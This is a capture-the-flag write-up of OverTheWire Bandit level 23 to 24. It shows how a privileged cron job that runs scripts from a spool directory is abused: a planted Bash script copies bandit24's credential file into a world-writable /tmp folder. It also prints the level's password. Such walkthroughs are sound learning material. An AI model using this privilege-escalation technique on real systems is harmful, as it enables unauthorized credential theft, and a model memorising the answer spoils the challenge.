# OverTheWire Bandit Write-Up: Level 23 → Level 24

## Objective
Retrieve the password for `bandit24` by writing a custom Bash script and placing it inside `/var/spool/bandit24/foo/`, where a privileged `bandit24` cron job automatically executes and deletes scripts every minute.

---

## How I Solved It

### 1. Inspected `/etc/cron.d/cronjob_bandit24` and Its Script
After logging into `bandit23`, I checked `/etc/cron.d/` and read `cronjob_bandit24` along with `/usr/bin/cronjob_bandit24.sh`:

```bash
cd /etc/cron.d
ls
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```

* **Key Findings from `/usr/bin/cronjob_bandit24.sh`:**
  * The cron job runs every minute (`* * * * *`) as `bandit24`.
  * It navigates to `/var/spool/bandit24/foo`.
  * For every file owned by `bandit23`, it executes the script with a 60-second timeout (`timeout -s 9 60 "./$i"`) and then removes it (`rm -rf "./$i"`).

### 2. Created a World-Writable Workspace and Payload Script
Because `/etc/cron.d` is not writable (`mkdir: Permission denied`), I created a working directory inside `/tmp/` and opened its permissions (`chmod 777`) so `bandit24` could write the password output back into it:

```bash
mkdir /tmp/me
cd /tmp/me
chmod 777 .
```

Next, I created `mescript.sh` to copy `/etc/bandit_pass/bandit24` into `/tmp/me/pasword.txt` and made the script executable (`chmod +x`):

```bash
nano mescript.sh
```
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/me/pasword.txt
```
```bash
chmod +x mescript.sh
```

### 3. Copied the Script into `/var/spool/bandit24/foo/`
Initially, attempting to copy directly into `/var/spool/bandit24/` failed with `Operation not permitted`. Copying into the `/foo/` subdirectory succeeded:

```bash
cp mescript.sh /var/spool/bandit24/foo/
```

### 4. Retrieved the `bandit24` Password
After waiting roughly one minute for the cron job to execute `mescript.sh`, `ls -la` confirmed that `pasword.txt` was created and owned by `bandit24`. I read the file to get the password:

```bash
ls -la
cat /tmp/me/pasword.txt
```

---

## Flag / Password Found
* **Bandit24 Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

## What I Learned
* How privileged cron jobs that execute user-supplied files in spool directories (`/var/spool/bandit24/foo/`) can be leveraged for privilege escalation.
* Why both the payload script (`chmod +x`) and the output destination directory (`chmod 777 /tmp/me`) need appropriate permissions when a different user account executes the script.

